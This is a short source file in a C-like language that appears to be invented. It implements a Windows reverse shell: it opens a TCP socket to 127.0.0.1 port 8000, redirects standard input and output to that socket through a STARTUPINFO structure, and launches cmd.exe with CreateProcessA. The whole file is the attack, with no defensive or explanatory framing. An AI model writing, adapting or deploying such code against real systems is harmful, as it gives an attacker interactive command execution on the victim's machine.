declare("CreateProcessA", "kernel32.dll");

import libraries.os.network

int fn main() {
   int ip = IP(127.0.0.1);
   int port = 8000;
   string cmd_line = "cmd.exe";
   int socket = ConnectTcp(ip, port);
   array startup_info int[17];
   startup_info[11] = 0x100;
   startup_info[14] = socket;
   startup_info[15] = socket;
   startup_info[16] = socket;
   array process_info int[4];
   startup_info[0] = 0x44;
   CreateProcessA(0, cmd_line, 0, 0, 1, 0, 0, 0, startup_info, process_info);
   TerminateProcess(0, 0xffffffff);
   return 1;
}